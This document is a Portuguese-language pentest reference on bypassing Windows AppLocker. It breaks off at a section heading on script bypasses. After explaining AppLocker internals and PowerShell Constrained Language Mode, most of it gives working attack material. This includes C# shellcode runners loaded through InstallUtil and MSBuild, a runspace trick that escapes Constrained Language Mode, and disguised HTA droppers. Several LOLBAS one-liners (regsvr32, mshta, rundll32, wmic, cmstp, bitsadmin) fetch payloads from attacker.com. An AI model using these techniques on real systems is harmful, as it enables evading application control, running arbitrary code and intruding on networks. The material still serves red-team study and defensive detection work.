---
title: "AppLocker Bypass"
---

# AppLocker Bypass

# O que é?

AppLocker é uma feature de application control do Windows introduzida no Windows 7 e Windows
Server 2008 R2, disponível nas edições Enterprise e Ultimate. Sucessora do Software Restriction
Policies (SRP) introduzido no Windows XP, o AppLocker permite que administradores definam
regras que determinam quais executáveis, scripts, instaladores e DLLs podem ou não rodar no
sistema.

As regras do AppLocker são baseadas em três critérios de identificação:

```
Publisher (assinatura digital Authenticode)
  — verifica o certificado que assinou o binário
  — pode ser configurado em granularidade crescente:
      qualquer binário da Microsoft
      qualquer binário do produto X da Microsoft
      arquivo específico de produto específico
      versão mínima ou exata do arquivo

Path (caminho no filesystem)
  — suporta wildcards com variáveis de ambiente
  — ex: %WINDIR%\* permite tudo dentro de C:\Windows\
  — vulnerável se usuário pode escrever dentro do path permitido

Hash (hash criptográfico SHA-256 do arquivo)
  — mais seguro: qualquer modificação no arquivo muda o hash
  — imune a renomeação
  — dificil de manter em produção (toda atualização exige nova regra)
```

As regras são organizadas em "Rule Collections" — grupos por tipo de arquivo:

```
Executable Rules    — .exe e .com
Script Rules        — .ps1, .bat, .cmd, .vbs, .js
Windows Installer   — .msi, .msp, .mst
Packaged App Rules  — MSIX e AppX (Microsoft Store apps)
DLL Rules           — .dll e .ocx (opcional, desabilitado por padrao)
```

Cada Rule Collection pode estar independentemente em modo Not Configured, Audit Only ou
Enforced. Se uma Collection nao tem regras configuradas, todos os arquivos daquele tipo sao
permitidos para todos os usuarios — mesmo que outras Collections estejam em Enforce mode.

O AppLocker opera com logica default-deny: quando regras existem para uma Collection e o
arquivo nao corresponde a nenhuma Allow rule, a execucao e bloqueada.

# Onde e implementado?

O AppLocker e encontrado em ambientes corporativos com Windows Enterprise em cenarios onde
controle de software e requisito de compliance ou seguranca:

```
Ambientes regulados por compliance:
  CDE (Cardholder Data Environments) — exigido para PCI-DSS nivel 1
  Ambientes SWIFT (Society for Worldwide Interbank Financial Telecommunication)
  Ambientes governamentais com NIST 800-53 ou CMMC
  Hospitais e saude (HIPAA com controle de aplicacoes)

Tipos de workstation onde e mais comum:
  Kiosks e terminais de uso dedicado (caixas, PDVs, terminais de atendimento)
  Workstations gerenciadas em ambientes financeiros e bancos
  Ambientes de call center com software controlado
  Laboratorios e ambientes de pesquisa com whitelist estrita

Gerenciamento corporativo:
  Deployado via Group Policy Objects (GPO) — requer AppID service rodando
  Gerenciado via Microsoft Intune (MDM) em ambientes modernos
  Deployado via SCCM / Microsoft Endpoint Configuration Manager
  Integrado com Active Directory para aplicacao por OU e grupo de seguranca

Requisito de infraestrutura:
  Disponivel apenas em Windows Enterprise e Education
  Exige que o servico Application Identity (AppIDSvc) esteja rodando
  Nao disponivel em Windows Home ou Pro (apenas SRP nesses casos)
```

**Ambientes que tipicamente NAO tem AppLocker ativo:**

A maioria dos ambientes corporativos medianos — mesmo com Active Directory — nao tem AppLocker
configurado em Enforce mode. Audit mode e mais comum (gera logs sem bloquear). O overhead
operacional de manter uma whitelist atualizada e alto, especialmente com DLL Rules ativas.

**AppLocker vs. WDAC (Windows Defender Application Control):**

AppLocker e considerado tecnologia legada pela Microsoft a partir do Windows 10 1903. A
Microsoft recomenda migracao para WDAC para ambientes novos. No entanto, AppLocker ainda e
amplamente deployado por ser mais simples de gerenciar. Ambos podem coexistir.

# Como funciona de forma adequada?

O AppLocker usa uma arquitetura de dois componentes — um driver de kernel e um servico de
userland — que trabalham juntos para interceptar e avaliar execucoes antes de permitir ou
bloquear.

```
+------------------------------------------------------------------+
|  USUARIO tenta executar: C:\Users\user\Downloads\malware.exe     |
+------------------------------------------------------------------+
         |
         v
+------------------------------------------------------------------+
|  KERNEL: NtCreateUserProcess ou NtCreateSection e chamado        |
|                                                                  |
|  appid.sys (kernel driver do AppLocker) intercepta via:          |
|    PsSetCreateProcessNotifyRoutine  — criacao de processo        |
|    PsSetLoadImageNotifyRoutine      — carregamento de imagem     |
|                                                                  |
|  Driver extrai informacoes do arquivo:                           |
|    - Path completo no filesystem                                 |
|    - File Object (referencia ao arquivo em disco)                |
+------------------------------------------------------------------+
         |
         v
+------------------------------------------------------------------+
|  CONSULTA AO SERVICO AppIDSvc (svchost.exe)                      |
|                                                                  |
|  AppIDSvc realiza verificacoes custosas:                         |
|    1. Calcula hash SHA-256 do arquivo                            |
|    2. Verifica assinatura Authenticode (cadeia de certificados)  |
|    3. Extrai publisher, product name, file version               |
|    4. Consulta regras AppLocker via LDAP (GPO do dominio)        |
|                                                                  |
|  Ordem de avaliacao das regras:                                  |
|    Deny rules tem prioridade sobre Allow rules                   |
|    Regras sao avaliadas: Hash > Publisher > Path                 |
|    (mais especifica primeiro dentro de cada categoria)           |
+------------------------------------------------------------------+
         |
         v
+------------------------------------------------------------------+
|  RESULTADO DA AVALIACAO                                          |
|                                                                  |
|  +-- Corresponde a Allow rule?                                   |
|  |     SIM -> execucao permitida                                 |
|  |     NAO -> verificar se ha Deny rule explicitamente           |
|  |                                                               |
|  +-- Nenhuma regra corresponde (Collection esta em Enforce)?     |
|        -> BLOQUEAR execucao                                      |
|        -> Gerar EventID 8004 (EXE) ou 8006 (Script)             |
|                                                                  |
|  Resultado e CACHEADO para execucoes subsequentes do mesmo       |
|  arquivo (path + hash). Cache invalida quando arquivo muda.      |
+------------------------------------------------------------------+
```

**Como o Audit Mode vs Enforce Mode funcionam:**

```
Audit Mode (EnforcementMode = 2):
  Arquivo seria bloqueado por regras -> EventID 8002 (permitido) e 8003 (auditado)
  Execucao acontece normalmente
  Util para mapear o que seria bloqueado antes de ativar enforcement

Enforce Mode (EnforcementMode = 1):
  Arquivo nao corresponde a nenhuma Allow rule -> BLOQUEADO
  EventID 8004 (EXE bloqueado) ou 8006 (Script bloqueado) gerado
  Logs em: Microsoft-Windows-AppLocker/EXE and DLL

Not Configured (EnforcementMode = 0):
  Nenhuma regra para este tipo de arquivo
  Todos os arquivos sao permitidos, mesmo que outras Collections estejam ativas
```

**Application Identity Service (AppIDSvc) — dependencia critica:**

```
AppLocker DEPENDE do servico AppIDSvc para funcionar.
Se o servico nao esta rodando, AppLocker NAO enforced nenhuma politica.

Verificar estado:
  Get-Service AppIDSvc
  sc query AppIDSvc

Servico configurado como Automatic em deployments corretos.
Em ambientes mal configurados, o servico pode estar Stopped ou Disabled,
desabilitando AppLocker silenciosamente mesmo com regras configuradas.
```

**Default Rules criadas pelo wizard do AppLocker:**

```
Executable Rules:
  (Allow) Everyone:               %PROGRAMFILES%\*
  (Allow) Everyone:               %WINDIR%\*
  (Allow) BUILTIN\Administrators: *   <- admins podem executar qualquer coisa

Script Rules:
  (Allow) Everyone:               %PROGRAMFILES%\*
  (Allow) Everyone:               %WINDIR%\*
  (Allow) BUILTIN\Administrators: *

Windows Installer Rules:
  (Allow) Everyone:               (Qualquer MSI assinado digitalmente)
  (Allow) Everyone:               %WINDIR%\Installer\*
  (Allow) BUILTIN\Administrators: *
```

**Fraqueza fundamental das Default Rules:** qualquer path dentro de `%WINDIR%` onde um usuario
nao-privilegiado possa escrever arquivos permite bypass imediato via path rule, pois a regra
`%WINDIR%\*` e aplicada sem verificacao de quem escreveu o arquivo naquele path.

---

## A Arquitetura do AppLocker

### Arquitetura Interna

AppLocker opera através de uma combinação de componentes em kernel e userland:

**appid.sys** — driver de kernel que intercepta chamadas de criação de processo e carregamento de imagem via callbacks do kernel (PsSetLoadImageNotifyRoutine, PsSetCreateProcessNotifyRoutine). Cada vez que um processo tenta executar um arquivo, o driver verifica a política antes de permitir.

**AppID Service (appidsvc)** — serviço de userland (svchost.exe -k LocalServiceNetworkRestricted) responsável por manter o cache de políticas, calcular hashes de arquivos e consultar informações de certificado. O driver do kernel delega a avaliação de regra mais complexa para este serviço.

**SRP (Software Restriction Policy)** — predecessor do AppLocker, introduzido no Windows XP. Funciona via SAFER API. AppLocker é a evolução do SRP para Windows 7+, com suporte a regras por usuário/grupo, publisher rules e melhor integração com Group Policy. Ambos podem coexistir, mas AppLocker tem precedência em sistemas suportados.

**Fluxo de execução:**
1. Usuário tenta executar `malware.exe`
2. kernel chama callback registrado por appid.sys
3. appid.sys consulta AppID Service com path + hash do arquivo
4. AppID Service avalia regras na ordem: Deny > Allow
5. Se nenhuma Allow rule corresponde, execução é bloqueada
6. Resultado é cacheado para execuções futuras do mesmo arquivo

### Três Tipos de Regra

**1. Path Rules**
Baseadas no caminho do arquivo. Suportam wildcards com variáveis de ambiente.

Exemplos de regras padrão:
```
%WINDIR%\*           → Allow (tudo dentro de C:\Windows\)
%PROGRAMFILES%\*     → Allow (tudo em C:\Program Files\)
%PROGRAMFILES(X86)%\*→ Allow (C:\Program Files (x86)\)
```

Fraqueza fundamental: se um usuário puder escrever em qualquer path dentro de `%WINDIR%`, pode colocar seu executável lá e a path rule o permitirá.

**2. Publisher/Certificate Rules (Regras de Publisher)**
Verificam a assinatura Authenticode do binário. Podem ser configuradas em níveis:
- Publisher apenas (qualquer binário da Microsoft)
- Publisher + Product (qualquer binário do produto X da Microsoft)
- Publisher + Product + File (arquivo específico de produto específico)
- Publisher + Product + File + Version (versão mínima ou exata)

Fraqueza: se o atacante usa um binário legítimo assinado (LOLBAS), passa pela publisher rule. Além disso, se o ambiente permite "any file signed by Microsoft", isso inclui `regsvr32.exe`, `mshta.exe`, `wmic.exe` — todos usáveis como bypass.

**3. Hash Rules**
Verificam o hash SHA-256 do arquivo. Mais segura que path rules, imune a renomeação.

Fraqueza: qualquer modificação no arquivo (mesmo adicionar um byte) muda o hash. Impossível de usar com arquivos mutáveis. Hash rules são raras em produção por dificuldade de manutenção — cada atualização de software requer atualização das regras.

### Default Rules

Quando AppLocker é configurado, as seguintes regras padrão são criadas automaticamente se selecionadas no wizard:

**Executables (EXE e COM):**
- `(Allow) Everyone: %PROGRAMFILES%\*`
- `(Allow) Everyone: %WINDIR%\*`
- `(Allow) BUILTIN\Administrators: *` (administradores podem executar qualquer coisa)

**Scripts (PS1, BAT, CMD, VBS, JS):**
- `(Allow) Everyone: %PROGRAMFILES%\*`
- `(Allow) Everyone: %WINDIR%\*`
- `(Allow) BUILTIN\Administrators: *`

**Windows Installer (MSI e MSP):**
- `(Allow) Everyone: (Digitally signed by any publisher)`
- `(Allow) Everyone: %WINDIR%\Installer\*`
- `(Allow) BUILTIN\Administrators: *`

**DLL Rules (opcional — raramente ativada):**
Nao habilitada por padrao porque causa impacto severo de performance (cada DLL carregada e verificada).

**Importante:** Se AppLocker nao tem regras para um tipo especifico (ex: sem Script Rules), scripts desse tipo sao permitidos para todos — mesmo que EXE rules estejam ativas.

### Politica por Collection

AppLocker organiza regras em "collections" (grupos de tipo de arquivo):
- Executable rules (EXE, COM)
- Windows Installer rules (MSI, MSP, MST)
- Script rules (PS1, BAT, CMD, VBS, JS)
- DLL rules (DLL, OCX)
- Packaged app rules (APPX)

Cada collection pode estar em modo diferente: **Not Configured**, **Audit Only**, ou **Enforced**.

### PowerShell Constrained Language Mode (CLM) — O Efeito Colateral Crítico

Quando AppLocker (ou WDAC) está em modo Enforce, **PowerShell entra automaticamente em Constrained Language Mode**. Esse é o controle de segurança mais importante na cadeia — sem CLM, AppLocker pode ser trivialmente burlado executando shellcode runner em PowerShell.

#### Os 4 Language Modes do PowerShell

| Mode | Capacidades | Quando ativa |
|------|-------------|--------------|
| `FullLanguage` | Todos cmdlets + .NET completo + C# inline via Add-Type | Default sem WDAC/AppLocker; admin com IL não-restrito |
| `ConstrainedLanguage` | Cmdlets aprovados + tipos core (.NET limitado, sem reflection) | AppLocker/WDAC ativo |
| `RestrictedLanguage` | Apenas variáveis/cmdlets aprovados, sem operators | Cenários de delegação JEA |
| `NoLanguage` | Apenas comandos pré-aprovados, sem script | Hardcoded em DSC |

#### O Que CLM Bloqueia

```powershell
# Verificar modo atual
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage

# Bloqueado em CLM:
[Math]::Cos(1)
# Cannot invoke method. Method invocation is supported only on core types in this language mode.

Add-Type -TypeDefinition $csharp     # Bloqueado
New-Object Net.Sockets.TcpClient     # Bloqueado (tipo não-core)
[Ref].Assembly.GetType(...)          # Bloqueado (reflection)
```

Consequência: shellcode runners PowerShell tradicionais (com `Add-Type` + Win32 APIs) **não funcionam** em CLM. Bypass do AppLocker executável sem bypass de CLM = inútil.

#### Por Que CLM Existe

PowerShell 3.0 introduziu CLM exatamente para fechar essa lacuna. Antes disso, ataques pós-AppLocker simplesmente executavam `powershell.exe -ExecutionPolicy Bypass -Command "<.NET reflection runner>"` para contornar todo o whitelisting via tradecraft in-memory.

#### Bypass — Custom Runspaces em C#

A **DLL principal do PowerShell** (`System.Management.Automation.dll`) expõe APIs públicas para criar runspaces. Um runspace criado programaticamente via `RunspaceFactory.CreateRunspace()` **não herda** o CLM imposto pelo `PowerShell.exe` host — porque CLM é aplicado pelo *processo host*, não pelo runspace em si.

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass {
    class Program {
        static void Main(string[] args) {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            // Executar PowerShell em FullLanguage dentro do nosso processo C#
            string cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File C:\\Tools\\test.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```

Compilar como Release/x64 → executar → resultado em `test.txt` = `FullLanguage`. Bypass confirmado.

**Problema circular**: o C# compilado também é EXE → AppLocker bloqueia se não estiver em path whitelisted. Soluções:
- Copiar para path autorizado (`C:\Windows\Tasks\` em default rules)
- Embutir o C# em assembly carregado por LOLBAS (InstallUtil, MSBuild, regsvr32)

#### Bypass Combinado — InstallUtil + Custom Runspace

`InstallUtil.exe` (Microsoft-assinado, em `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\`) carrega `[RunInstaller(true)]` classes de um assembly fornecido. Colocar o custom runspace dentro do método `Uninstall` permite ignorar regras de EXE (porque o assembly não é executado como EXE — é carregado pelo `InstallUtil`):

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass {
    class Program {
        static void Main(string[] args) {
            Console.WriteLine("decoy main");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer {
        public override void Uninstall(System.Collections.IDictionary savedState) {
            string cmd = "<powershell shellcode runner>";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```

Trigger:
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe ^
    /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
```

Flags importantes:
- `/U` → invoca `Uninstall` (não requer admin; `Install` requer)
- `/logfile=` → desabilita logfile (anti-OPSEC trail)
- `/LogToConsole=false` → suprime output

Cadeia completa para AppLocker sem disk write:
```cmd
certutil -encode Bypass.exe encoded.txt              # ofuscar (servidor atacante)
bitsadmin /Transfer myJob http://kali/encoded.txt    # baixar (LOLBAS)
certutil -decode encoded.txt Bypass.exe              # desofuscar
installutil.exe /logfile= /LogToConsole=false /U Bypass.exe
```

Todos componentes são Microsoft-assinados + whitelisted por default → AppLocker permite cada um individualmente, mas a combinação executa shellcode em FullLanguage.

---

## Na Pratica

### Identificar AppLocker Ativo

**Via PowerShell:**
```powershell
# Ver politica efetiva completa
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Ver apenas regras de executaveis
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections |
    Where-Object {$_.RuleCollectionType -eq "Exe"}

# Testar se um arquivo especifico seria permitido
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path "C:\temp\test.exe" -User Everyone

# Ver politica em formato XML (util para analise detalhada)
Get-AppLockerPolicy -Effective -Xml
```

**Via Registry:**
```
HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2\
```
Subkeys: `Exe`, `Msi`, `Script`, `Dll`, `Appx`

Cada subkey contem:
- `EnforcementMode` (DWORD): 0 = Not Configured, 1 = Enforced, 2 = Audit Only
- Regras individuais como values com GUID como nome

```powershell
# Verificar via registry
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe" -ErrorAction SilentlyContinue

# Ver modo de enforcement
(Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe").EnforcementMode
# 0 = Not Configured, 1 = Enforced, 2 = Audit
```

**Via AppLocker Service:**
```powershell
Get-Service AppIDSvc
# AppLocker requer que AppIDSvc esteja rodando para enforcement
```

**Identificar sem PowerShell (cmd basico):**
```cmd
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2" /s
```

### Identificar Paths Gravaveis dentro de %WINDIR%

Esta e a classe de bypass mais fundamental. Se existe um diretorio dentro de `C:\Windows\` onde usuarios nao-privilegiados podem criar arquivos, qualquer executavel colocado la sera permitido pela default path rule `%WINDIR%\*`.

**Paths gravaveis conhecidos por usuarios padrao:**

```
C:\Windows\Tasks\
C:\Windows\Temp\
C:\Windows\tracing\
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\
C:\Windows\System32\spool\drivers\color\
C:\Windows\SysWOW64\Tasks\
C:\Windows\System32\Tasks\
C:\Windows\System32\FxsTmp\
C:\Windows\System32\com\dmp\
C:\Windows\SysWOW64\com\dmp\
C:\Windows\SysWOW64\FxsTmp\
```

**Verificar com icacls:**
```cmd
icacls C:\Windows\Tasks
icacls C:\Windows\Temp
icacls "C:\Windows\System32\spool\drivers\color"
icacls "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys"
```

Procurar por: `(W)` (Write), `(F)` (Full Control), `(M)` (Modify) para `Everyone`, `Users`, ou `BUILTIN\Users`.

**Verificar com accesschk (Sysinternals):**
```cmd
accesschk.exe -wud "C:\Windows" -s 2>nul
REM -w: apenas writeable
REM -u: suprimir erros
REM -d: apenas diretorios
REM -s: recursivo
```

**Script PowerShell para encontrar paths gravaveis:**
```powershell
$windir = "C:\Windows"
$writable = @()

Get-ChildItem -Path $windir -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $acl = Get-Acl $_.FullName -ErrorAction Stop
        foreach ($ace in $acl.Access) {
            if ($ace.FileSystemRights -match "Write|FullControl|Modify" -and
                ($ace.IdentityReference -match "Everyone|Users|Authenticated Users")) {
                $writable += $_.FullName
                break
            }
        }
    } catch {}
}
$writable
```

---

## Exemplos de Codigo / Comandos

### 1. LOLBAS Bypasses — Binarios Legitimos Assinados pela Microsoft

#### regsvr32 — "Squiblydoo"

Regsvr32 registra e desregistra COM DLLs. Com o parametro `/i:`, aceita um URL para buscar um arquivo SCT (scriptlet) e executa seu conteudo JScript/VBScript dentro do processo `regsvr32.exe`.

```cmd
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```

- `/s` — silent (sem UI)
- `/n` — nao chama DllRegisterServer
- `/u` — unregister mode (necessario com /i)
- `/i:URL` — passa URL como argumento para DllInstall

**Arquivo SCT (scriptlet) completo — regsvr32 baixa e executa este XML:**

O SCT e um arquivo XML que contem codigo JScript ou VBScript dentro de uma tag `<script>`. O scrobj.dll (Script Component Runtime) processa o arquivo. Ao receber o arquivo via HTTP, o scrobj.dll instancia o componente e executa o codigo do script que por sua vez usa ActiveXObject("WScript.Shell") para executar comandos do sistema.

Estrutura do arquivo SCT:
- Tag `<scriptlet>` como raiz
- Tag `<registration>` com classid e progid
- Tag `<script language="JScript">` com CDATA contendo o codigo
- O codigo instancia WScript.Shell e chama o metodo Run com o comando desejado

Por que funciona: regsvr32.exe e assinado pela Microsoft e esta em `%WINDIR%\System32\` — passa por qualquer publisher rule e path rule. O scrobj.dll processa o SCT remotamente sem gravar em disco.

**Versao local (sem rede):**
```cmd
regsvr32 /s /n /u /i:C:\Windows\Tasks\payload.sct scrobj.dll
```

O arquivo SCT pode ser colocado em qualquer path gravavel dentro de %WINDIR%.

#### mshta — Microsoft HTML Application Host

Executa arquivos HTA (HTML Application). Tem acesso completo a objetos COM/ActiveX com privilegios do usuario atual.

```cmd
mshta http://attacker.com/payload.hta
mshta "vbscript:CreateObject("WScript.Shell").Run("cmd /c calc")(window.close)"
```

**Arquivo HTA completo (VBScript):**
```html
<html>
<head>
<title>Loading...</title>
<HTA:APPLICATION
  APPLICATIONNAME="Update"
  BORDER="none"
  BORDERSTYLE="none"
  CAPTION="no"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  SYSMENU="no"
  WINDOWSTATE="minimize"
/>
<script language="VBScript">
Sub Main()
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")
    ' Executar payload via PowerShell encoded command
    ' Payload base64 gerado com:
    '   $cmd = "IEX((New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1'))"
    '   [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
    Dim encoded
    encoded = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABzAC4AcABzADEAJwApAA=="
    oShell.Run "powershell -nop -w hidden -enc " & encoded, 0, False
    Self.Close
End Sub

Main()
</script>
</head>
<body>
<p>Carregando atualizacao...</p>
</body>
</html>
```

**HTA com download e execucao (VBScript puro, download via WebClient):**
```html
<html>
<head>
<HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no"/>
<script language="VBScript">
Sub Main()
    Dim oShell, oHTTP, cmd
    Set oShell = CreateObject("WScript.Shell")
    ' Comando para download e execucao via PowerShell
    cmd = "cmd /c powershell -nop -sta -w 1 -c ""IEX((New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1'))"""
    oShell.Run cmd, 0, False
    Self.Close
End Sub
Main()
</script>
</head>
<body></body>
</html>
```

#### rundll32

Carrega DLL e chama funcao exportada. Pode apontar para share UNC remoto via SMB.

```cmd
rundll32 \\attacker.com\share\payload.dll,EntryPoint
```

**Variante com JScript inline (executa dentro do proprio rundll32.exe via mshtml):**

A tecnica usa o modulo mshtml.dll (Internet Explorer HTML engine) que aceita JScript via RunHTMLApplication. O JScript e passado como argumento de linha de comando. Internamente o mshtml processa o script e tem acesso a ActiveXObject — permitindo criacao de WScript.Shell para execucao de comandos.

Exemplo de uso sem rede (inline — sem arquivos externos):
```cmd
rundll32.exe mshtml.dll,RunHTMLApplication about:<hta:application/>
```

Com payload SCT via GetObject:
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";GetObject("script:http://attacker.com/payload.sct")
```

#### wmic — Windows Management Instrumentation Command-line

```cmd
wmic os get /format:"http://attacker.com/payload.xsl"
wmic process get brief /format:"http://attacker.com/payload.xsl"
```

**Arquivo XSL (XSLT Stylesheet com JScript — wmic processa via Microsoft XML):**

O parametro `/format:` do wmic aceita um arquivo XSL para transformar a saida XML do WMI. O Microsoft XML parser (msxml) suporta extensoes de script via `ms:script`, permitindo execucao de JScript ou VBScript dentro do contexto de transformacao XSLT. O wmic.exe baixa o arquivo XSL via HTTP e o processa.

Estrutura do arquivo XSL de bypass:
- Namespace `xmlns:ms="urn:schemas-microsoft-com:xslt"` para extensoes Microsoft
- Tag `<ms:script implements-prefix="user" language="JScript">` com codigo
- O codigo instancia ActiveXObject("WScript.Shell") e executa o comando
- Uma funcao no template chama o codigo do script durante a transformacao

O arquivo XSL e processado dentro do contexto do wmic.exe (assinado pela Microsoft, em %WINDIR%\System32\wbem\), bypassing AppLocker.

#### installutil — .NET Uninstall Method

InstallUtil carrega e executa assemblies .NET. Chama o metodo `Uninstall()` de classes que herdam de `System.Configuration.Install.Installer`.

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\payload.exe
```

**Payload .NET minimo em C# (payload.cs — compilar para payload.exe):**
```csharp
using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;

[System.ComponentModel.RunInstaller(true)]
public class Payload : Installer
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    // Shellcode aqui — gerado por msfvenom, Cobalt Strike, etc.
    // Exemplo: msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
    static byte[] shellcode = new byte[] { /* shellcode bytes */ };

    // Executado quando /U (uninstall) e passado como argumento
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        base.Uninstall(savedState);
        Execute();
    }

    // Tambem executado em install normal (sem /U)
    public override void Install(System.Collections.IDictionary stateSaver)
    {
        base.Install(stateSaver);
        Execute();
    }

    private void Execute()
    {
        IntPtr memory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
            0x3000,   // MEM_COMMIT | MEM_RESERVE
            0x40);    // PAGE_EXECUTE_READWRITE

        Marshal.Copy(shellcode, 0, memory, shellcode.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, memory, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
```

**Compilar sem acesso a Visual Studio:**
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Tasks\payload.exe payload.cs
```

#### MSBuild — Microsoft Build Engine

MSBuild executa projetos .csproj. Permite inline tasks com codigo C# compilado e executado em memoria pelo proprio MSBuild.

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Tasks\payload.csproj
```

**Arquivo .csproj completo com execucao de shellcode:**
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- Target que executa automaticamente ao chamar MSBuild.exe no arquivo -->
  <Target Name="Hello">
    <ClassExample />
  </Target>

  <!-- Inline Task: codigo C# compilado e executado em memoria pelo MSBuild -->
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <ParameterGroup/>
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Runtime.InteropServices;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;

          public class ClassExample : Task, ITask
          {
              [DllImport("kernel32")]
              static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);

              [DllImport("kernel32")]
              static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f,
                  IntPtr p, uint c, IntPtr i);

              [DllImport("kernel32")]
              static extern uint WaitForSingleObject(IntPtr h, uint ms);

              // Shellcode gerado por msfvenom ou Cobalt Strike payload generator
              // Exemplo: msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
              byte[] sc = new byte[] {
                  0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xdd, 0xff, 0xff, 0xff
                  // ... shellcode completo aqui
              };

              public override bool Execute()
              {
                  IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
                  Marshal.Copy(sc, 0, mem, sc.Length);
                  IntPtr t = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
                  WaitForSingleObject(t, 0xFFFFFFFF);
                  return true;
              }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Por que funciona: MSBuild.exe esta em `C:\Windows\Microsoft.NET\Framework\` — dentro de %WINDIR%, assinado pela Microsoft. O codigo C# e compilado em memoria pelo CodeTaskFactory sem gravar assembly em disco.

#### cmstp — Connection Manager Profile Installer

Instala perfis de Connection Manager. Aceita arquivo INF que pode referenciar SCT remoto.

```cmd
cmstp.exe /s /ns C:\Windows\Tasks\payload.inf
```

**Arquivo INF para bypass via SCT remoto:**
```ini
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://attacker.com/payload.sct

[Strings]
AppAlt="Bypass"
```

**Variante via RunPreSetupCommandsSection (executa cmd diretamente):**
```ini
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
cmd /c start /b powershell -nop -w hidden -enc <BASE64_PAYLOAD>
```

O `%11%` expande para `C:\Windows\System32`. O cmstp.exe e assinado pela Microsoft e reside em `%WINDIR%\System32\`.

### 2. Bypass via Paths Gravaveis

```powershell
# Copiar payload para path gravavel dentro de %WINDIR%
Copy-Item C:\Users\user\Downloads\beacon.exe C:\Windows\Tasks\svchost.exe

# Executar — passa pela path rule %WINDIR%\*
C:\Windows\Tasks\svchost.exe
```

```cmd
copy C:\temp\payload.exe "C:\Windows\System32\spool\drivers\color\payload.exe"
"C:\Windows\System32\spool\drivers\color\payload.exe"
```

### 3. Bypass via Scripts (quando apenas EXE rules estao ativas)

